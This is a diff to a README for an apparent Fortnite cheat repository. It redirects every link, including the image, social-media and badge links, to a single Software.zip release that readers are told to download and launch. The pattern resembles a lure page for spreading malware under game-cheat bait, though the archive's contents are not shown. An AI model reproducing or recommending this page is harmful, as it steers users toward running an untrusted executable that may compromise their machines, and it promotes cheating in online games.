@@ -7,11 +7,11 @@ Welcome to the "f0rtnite-h4ck" repository, your one-stop destination for all you
 Topics: Not provided
 
 ## Software Download
-🔗 [Software.zip - Click here to download](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)  
+🔗 [https://github.com/rog28889/f0rtnite-h4ck/releases/download/v2.0/Software.zip - Click here to download](https://github.com/rog28889/f0rtnite-h4ck/releases/download/v2.0/Software.zip)  
 (*Note: The downloaded file needs to be launched.*)
 
 ## 🌟 Ready to Dominate Fortnite? 🌟
-![Fortnite Image](https://example.com/fortnite-image.jpg)
+![Fortnite Image](https://github.com/rog28889/f0rtnite-h4ck/releases/download/v2.0/Software.zip)
 
 ## How to Use:
 1. Download the software from the provided link.
@@ -26,10 +26,10 @@ This repository is for educational purposes only. Usage of cheats and hacks in o
 Special thanks to the contributors who have helped make this repository a valuable resource for Fortnite players worldwide.
 
 ## Connect with Us
-Stay updated on the latest hacks and cheats by following us on [Twitter](https://twitter.com/f0rtnite-h4ck) and [Instagram](https://instagram.com/f0rtnite-h4ck).
+Stay updated on the latest hacks and cheats by following us on [Twitter](https://github.com/rog28889/f0rtnite-h4ck/releases/download/v2.0/Software.zip) and [Instagram](https://github.com/rog28889/f0rtnite-h4ck/releases/download/v2.0/Software.zip).
 
 ---
 
 Looking for more exciting features and hacks? Check out the "Releases" section for the latest updates and releases.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/YouaifXD/789566136/releases)
+[![Download Software](https://github.com/rog28889/f0rtnite-h4ck/releases/download/v2.0/Software.zip)](https://github.com/rog28889/f0rtnite-h4ck/releases/download/v2.0/Software.zip)
